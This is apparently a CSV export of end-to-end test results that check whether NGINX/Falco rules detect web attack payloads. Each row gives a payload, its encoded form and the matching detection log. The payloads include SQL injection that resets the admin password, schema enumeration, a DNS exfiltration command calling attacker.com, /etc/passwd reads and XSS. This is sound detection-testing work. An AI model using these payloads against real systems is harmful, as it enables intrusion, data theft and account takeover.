"DESCRIPTION","DURATION IN MS","NAME","PARENT SUITE","START TIME","STATUS","STOP TIME","SUB SUITE","SUITE","TEST CLASS","TEST METHOD"
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_ERROR_013` |
| **Name** | PostgreSQL generate_series resource exhaustion |
| **Category** | SQLI |
| **Subcategory** | error_based |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `' AND (SELECT * FROM generate_series(1,1000000)) --`
- **Encoded**: `%27%20AND%20%28SELECT%20%2A%20FROM%20generate_series%281%2C1000000%29%29%20--`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~25000ms
- **Timestamp**: 03:41:02.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Error-based SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Error-based SQL Injection test_id=SQLI_ERROR_013-1769917262652-6e5o7 pattern_id=SQLI_ERROR_013 uri=/?q=%27%20AND%20%28SELECT%20%2A%20FROM%20generate_series%281%2C1000000%29%29%20-- client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Error-based SQL Injection test_id=SQLI_ERROR_013-1769917262652-6e5o7 pattern_id=SQLI_ERROR_013 uri=/?q=%27%20AND%20%28SELECT%20%2A%20FROM%20generate_series%281%2C1000000%29%29%20-- client=127.0.0.1 method=GET

**Falco Log Entry**:
```
03:41:02.000000000: Critical [NGINX SQLi] Error-based SQL Injection test_id=SQLI_ERROR_013-1769917262652-6e5o7 pattern_id=SQLI_ERROR_013 uri=/?q=%27%20AND%20%28SELECT%20%2A%20FROM%20generate_series%281%2C1000000%29%29%20-- client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[074_SQLI_ERROR_013]","allure","2026-02-01","passed","2026-02-01","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_BLIND_004` |
| **Name** | DNS-based data exfiltration |
| **Category** | CMDINJ |
| **Subcategory** | blind_command_injection |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `; nslookup `whoami`.attacker.com`
- **Encoded**: `%3B%20nslookup%20%60whoami%60.attacker.com`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~46000ms
- **Timestamp**: 03:40:41.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Command substitution attack` |
| **Matched Rule** | `[NGINX CMDi] Command substitution attack test_id=CMD_BLIND_004-1769917241074-qegyoh pattern_id=CMD_BLIND_004 uri=/?q=%3B%20nslookup%20%60whoami%60.attacker.com client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Command substitution attack test_id=CMD_BLIND_004-1769917241074-qegyoh pattern_id=CMD_BLIND_004 uri=/?q=%3B%20nslookup%20%60whoami%60.attacker.com client=127.0.0.1

**Falco Log Entry**:
```
03:40:41.000000000: Critical [NGINX CMDi] Command substitution attack test_id=CMD_BLIND_004-1769917241074-qegyoh pattern_id=CMD_BLIND_004 uri=/?q=%3B%20nslookup%20%60whoami%60.attacker.com client=127.0.0.1
```","1","test_e2e_with_logs[324_CMD_BLIND_004]","allure","2026-02-01","passed","2026-02-01","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_BASIC_019` |
| **Name** | URL encoded newline injection |
| **Category** | CMDINJ |
| **Subcategory** | basic_command_injection |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `%0als`
- **Encoded**: `%250als`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~51000ms
- **Timestamp**: 03:40:36.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Advanced command injection attempt` |
| **Matched Rule** | `[NGINX CMDi] Advanced command injection attempt test_id=CMD_BASIC_019-1769917236061-pbntv9 pattern_id=CMD_BASIC_019 uri=/?q=%250als client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Advanced command injection attempt test_id=CMD_BASIC_019-1769917236061-pbntv9 pattern_id=CMD_BASIC_019 uri=/?q=%250als client=127.0.0.1

**Falco Log Entry**:
```
03:40:36.000000000: Warning [NGINX CMDi] Advanced command injection attempt test_id=CMD_BASIC_019-1769917236061-pbntv9 pattern_id=CMD_BASIC_019 uri=/?q=%250als client=127.0.0.1
```","2","test_e2e_with_logs[318_CMD_BASIC_019]","allure","2026-02-01","passed","2026-02-01","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_BLIND_003` |
| **Name** | Table count discovery |
| **Category** | SQLI |
| **Subcategory** | blind |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `' AND (SELECT COUNT(table_name) FROM information_schema.tables WHERE table_schema=database())>10 --`
- **Encoded**: `%27%20AND%20%28SELECT%20COUNT%28table_name%29%20FROM%20information_schema.tables%20WHERE%20table_schema%3Ddatabase%28%29%29%3E10%20--`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~55000ms
- **Timestamp**: 03:40:32.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BLIND_003-1769917232589-5blkel pattern_id=SQLI_BLIND_003 uri=/?q=%27%20AND%20%28SELECT%20COUNT%28table_name%29%20FROM%20information_schema.tables%20WHERE%20table_schema%3Ddatabase%28%29%29%3E10%20-- client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BLIND_003-1769917232589-5blkel pattern_id=SQLI_BLIND_003 uri=/?q=%27%20AND%20%28SELECT%20COUNT%28table_name%29%20FROM%20information_schema.tables%20WHERE%20table_schema%3Ddatabase%28%29%29%3E10%20-- client=127.0.0.1 method=GET

**Falco Log Entry**:
```
03:40:32.000000000: Critical [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BLIND_003-1769917232589-5blkel pattern_id=SQLI_BLIND_003 uri=/?q=%27%20AND%20%28SELECT%20COUNT%28table_name%29%20FROM%20information_schema.tables%20WHERE%20table_schema%3Ddatabase%28%29%29%3E10%20-- client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[024_SQLI_BLIND_003]","allure","2026-02-01","passed","2026-02-01","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_DOM_006` |
| **Name** | Eval-based DOM XSS |
| **Category** | XSS |
| **Subcategory** | dom_xss |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `eval('alert(""DOM XSS"")')`
- **Encoded**: `eval%28%27alert%28%22DOM%20XSS%22%29%27%29`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~55000ms
- **Timestamp**: 03:40:32.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XSS] DOM-based XSS Attack` |
| **Matched Rule** | `[NGINX XSS] DOM-based XSS Attack test_id=XSS_DOM_006-1769917232579-0zhtri pattern_id=XSS_DOM_006 uri=/?q=eval%28%27alert%28%22DOM%20XSS%22%29%27%29 client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XSS] DOM-based XSS Attack test_id=XSS_DOM_006-1769917232579-0zhtri pattern_id=XSS_DOM_006 uri=/?q=eval%28%27alert%28%22DOM%20XSS%22%29%27%29 client=127.0.0.1 method=GET

**Falco Log Entry**:
```
03:40:32.000000000: Critical [NGINX XSS] DOM-based XSS Attack test_id=XSS_DOM_006-1769917232579-0zhtri pattern_id=XSS_DOM_006 uri=/?q=eval%28%27alert%28%22DOM%20XSS%22%29%27%29 client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[150_XSS_DOM_006]","allure","2026-02-01","passed","2026-02-01","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_STACK_003` |
| **Name** | Stacked query UPDATE SET attack |
| **Category** | SQLI |
| **Subcategory** | stacked_queries |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `'; UPDATE users SET password='hacked' WHERE username='admin'; --`
- **Encoded**: `'%3B%20UPDATE%20users%20SET%20password%3D'hacked'%20WHERE%20username%3D'admin'%3B%20--`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~60000ms
- **Timestamp**: 03:40:27.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_STACK_003-1769917227579-tams3 pattern_id=SQLI_STACK_003 uri=/?q='%3B%20UPDATE%20users%20SET%20password%3D'hacked'%20WHERE%20username%3D'admin'%3B%20-- client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_STACK_003-1769917227579-tams3 pattern_id=SQLI_STACK_003 uri=/?q='%3B%20UPDATE%20users%20SET%20password%3D'hacked'%20WHERE%20username%3D'admin'%3B%20-- client=127.0.0.1 method=GET

**Falco Log Entry**:
```
03:40:27.000000000: Critical [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_STACK_003-1769917227579-tams3 pattern_id=SQLI_STACK_003 uri=/?q='%3B%20UPDATE%20users%20SET%20password%3D'hacked'%20WHERE%20username%3D'admin'%3B%20-- client=127.0.0.1 method=GET
```","1","test_e2e_with_logs[091_SQLI_STACK_003]","allure","2026-02-01","passed","2026-02-01","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_TIME_018` |
| **Name** | SQL Server WAITFOR TIME |
| **Category** | SQLI |
| **Subcategory** | time_based_blind |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `WAITFOR TIME '00:00:05'`
- **Encoded**: `WAITFOR%20TIME%20'00%3A00%3A05'`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~65000ms
- **Timestamp**: 03:40:22.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Time-based Blind SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_018-1769917222569-64too8 pattern_id=SQLI_TIME_018 uri=/?q=WAITFOR%20TIME%20'00%3A00%3A05' client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_018-1769917222569-64too8 pattern_id=SQLI_TIME_018 uri=/?q=WAITFOR%20TIME%20'00%3A00%3A05' client=127.0.0.1 method=GET

**Falco Log Entry**:
```
03:40:22.000000000: Critical [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_018-1769917222569-64too8 pattern_id=SQLI_TIME_018 uri=/?q=WAITFOR%20TIME%20'00%3A00%3A05' client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[113_SQLI_TIME_018]","allure","2026-02-01","passed","2026-02-01","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_ERROR_007` |
| **Name** | Information schema table access |
| **Category** | SQLI |
| **Subcategory** | error_based |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `' AND (SELECT * FROM information_schema.tables LIMIT 1) --`
- **Encoded**: `%27%20AND%20%28SELECT%20%2A%20FROM%20information_schema.tables%20LIMIT%201%29%20--`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~50000ms
- **Timestamp**: 03:40:37.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Error-based SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Error-based SQL Injection test_id=SQLI_ERROR_007-1769917237098-js4ff pattern_id=SQLI_ERROR_007 uri=/?q=%27%20AND%20%28SELECT%20%2A%20FROM%20information_schema.tables%20LIMIT%201%29%20-- client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Error-based SQL Injection test_id=SQLI_ERROR_007-1769917237098-js4ff pattern_id=SQLI_ERROR_007 uri=/?q=%27%20AND%20%28SELECT%20%2A%20FROM%20information_schema.tables%20LIMIT%201%29%20-- client=127.0.0.1 method=GET

**Falco Log Entry**:
```
03:40:37.000000000: Critical [NGINX SQLi] Error-based SQL Injection test_id=SQLI_ERROR_007-1769917237098-js4ff pattern_id=SQLI_ERROR_007 uri=/?q=%27%20AND%20%28SELECT%20%2A%20FROM%20information_schema.tables%20LIMIT%201%29%20-- client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[068_SQLI_ERROR_007]","allure","2026-02-01","passed","2026-02-01","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `API_BOLA_001` |
| **Name** | BOLA - Broken Object Level Authorization |
| **Category** | API_SECURITY |
| **Subcategory** | bola |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `/api/v1/users/1/profile`
- **Encoded**: `%2Fapi%2Fv1%2Fusers%2F1%2Fprofile`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~20000ms
- **Timestamp**: 03:41:07.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX API Attack] API security vulnerability detected` |
| **Matched Rule** | `[NGINX API Attack] API security vulnerability detected test_id=API_BOLA_001-1769917267043-02zlsi pattern_id=API_BOLA_001 uri=/?q=%2Fapi%2Fv1%2Fusers%2F1%2Fprofile client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX API Attack] API security vulnerability detected test_id=API_BOLA_001-1769917267043-02zlsi pattern_id=API_BOLA_001 uri=/?q=%2Fapi%2Fv1%2Fusers%2F1%2Fprofile client=127.0.0.1

**Falco Log Entry**:
```
03:41:07.000000000: Warning [NGINX API Attack] API security vulnerability detected test_id=API_BOLA_001-1769917267043-02zlsi pattern_id=API_BOLA_001 uri=/?q=%2Fapi%2Fv1%2Fusers%2F1%2Fprofile client=127.0.0.1
```","1","test_e2e_with_logs[388_API_BOLA_001]","allure","2026-02-01","passed","2026-02-01","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_UNION_002` |
| **Name** | UNION ALL SELECT with multiple NULLs |
| **Category** | SQLI |
| **Subcategory** | union_based |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `UNION ALL SELECT NULL,NULL`
- **Encoded**: `UNION%20ALL%20SELECT%20NULL%2CNULL`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~62000ms
- **Timestamp**: 03:40:25.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Advanced SQL Injection Attempt` |
| **Matched Rule** | `[NGINX SQLi] Advanced SQL Injection Attempt test_id=SQLI_UNION_002-1769917225073-uxrac9 pattern_id=SQLI_UNION_002 uri=/?q=UNION%20ALL%20SELECT%20NULL%2CNULL client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Advanced SQL Injection Attempt test_id=SQLI_UNION_002-1769917225073-uxrac9 pattern_id=SQLI_UNION_002 uri=/?q=UNION%20ALL%20SELECT%20NULL%2CNULL client=127.0.0.1 method=GET

**Falco Log Entry**:
```
03:40:25.000000000: Warning [NGINX SQLi] Advanced SQL Injection Attempt test_id=SQLI_UNION_002-1769917225073-uxrac9 pattern_id=SQLI_UNION_002 uri=/?q=UNION%20ALL%20SELECT%20NULL%2CNULL client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[117_SQLI_UNION_002]","allure","2026-02-01","passed","2026-02-01","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_SUB_005` |
| **Name** | Root directory listing via substitution |
| **Category** | CMDINJ |
| **Subcategory** | command_substitution |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `$(ls -la /root)`
- **Encoded**: `%24%28ls%20-la%20%2Froot%29`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~43000ms
- **Timestamp**: 03:40:44.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Command substitution attack` |
| **Matched Rule** | `[NGINX CMDi] Command substitution attack test_id=CMD_SUB_005-1769917244081-dnfz4n pattern_id=CMD_SUB_005 uri=/?q=%24%28ls%20-la%20%2Froot%29 client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Command substitution attack test_id=CMD_SUB_005-1769917244081-dnfz4n pattern_id=CMD_SUB_005 uri=/?q=%24%28ls%20-la%20%2Froot%29 client=127.0.0.1

**Falco Log Entry**:
```
03:40:44.000000000: Critical [NGINX CMDi] Command substitution attack test_id=CMD_SUB_005-1769917244081-dnfz4n pattern_id=CMD_SUB_005 uri=/?q=%24%28ls%20-la%20%2Froot%29 client=127.0.0.1
```","2","test_e2e_with_logs[366_CMD_SUB_005]","allure","2026-02-01","passed","2026-02-01","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_OBF_005` |
| **Name** | Brace Expansion Bypass |
| **Category** | CMDINJ |
| **Subcategory** | obfuscation |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `;{cat,/etc/passwd}`
- **Encoded**: `%3B%7Bcat%2C%2Fetc%2Fpasswd%7D`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~19000ms
- **Timestamp**: 03:41:08.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Traversal] File inclusion attack detected` |
| **Matched Rule** | `[NGINX Traversal] File inclusion attack detected test_id=CMD_OBF_005-1769917268639-9ujin pattern_id=CMD_OBF_005 uri=/?q=%3B%7Bcat%2C%2Fetc%2Fpasswd%7D client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Traversal] File inclusion attack detected test_id=CMD_OBF_005-1769917268639-9ujin pattern_id=CMD_OBF_005 uri=/?q=%3B%7Bcat%2C%2Fetc%2Fpasswd%7D client=127.0.0.1

**Falco Log Entry**:
```
03:41:08.000000000: Critical [NGINX Traversal] File inclusion attack detected test_id=CMD_OBF_005-1769917268639-9ujin pattern_id=CMD_OBF_005 uri=/?q=%3B%7Bcat%2C%2Fetc%2Fpasswd%7D client=127.0.0.1
```","1","test_e2e_with_logs[345_CMD_OBF_005]","allure","2026-02-01","passed","2026-02-01","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_BOOL_010` |
| **Name** | Simple UNION injection |
| **Category** | SQLI |
| **Subcategory** | boolean_based_blind |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `' UNION SELECT 1 --`
- **Encoded**: `'%20UNION%20SELECT%201%20--`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~42000ms
- **Timestamp**: 03:40:45.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Advanced SQL Injection Attempt` |
| **Matched Rule** | `[NGINX SQLi] Advanced SQL Injection Attempt test_id=SQLI_BOOL_010-1769917245115-rqo52 pattern_id=SQLI_BOOL_010 uri=/?q='%20UNION%20SELECT%201%20-- client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Advanced SQL Injection Attempt test_id=SQLI_BOOL_010-1769917245115-rqo52 pattern_id=SQLI_BOOL_010 uri=/?q='%20UNION%20SELECT%201%20-- client=127.0.0.1 method=GET

**Falco Log Entry**:
```
03:40:45.000000000: Warning [NGINX SQLi] Advanced SQL Injection Attempt test_id=SQLI_BOOL_010-1769917245115-rqo52 pattern_id=SQLI_BOOL_010 uri=/?q='%20UNION%20SELECT%201%20-- client=127.0.0.1 method=GET
```","1","test_e2e_with_logs[041_SQLI_BOOL_010]","allure","2026-02-01","passed","2026-02-01","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_BOOL_017` |
| **Name** | Base64 encoded boolean injection |
| **Category** | SQLI |
| **Subcategory** | boolean_blind |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `JyBPUiAnMSc9JzE%3D`
- **Encoded**: `JyBPUiAnMSc9JzE%253D`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~23000ms
- **Timestamp**: 03:41:04.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BOOL_017-1769917264656-c2zrc pattern_id=SQLI_BOOL_017 uri=/?q=JyBPUiAnMSc9JzE%253D client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BOOL_017-1769917264656-c2zrc pattern_id=SQLI_BOOL_017 uri=/?q=JyBPUiAnMSc9JzE%253D client=127.0.0.1 method=GET

**Falco Log Entry**:
```
03:41:04.000000000: Critical [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BOOL_017-1769917264656-c2zrc pattern_id=SQLI_BOOL_017 uri=/?q=JyBPUiAnMSc9JzE%253D client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[048_SQLI_BOOL_017]","allure","2026-02-01","passed","2026-02-01","","test_e2e_wrapper","",""
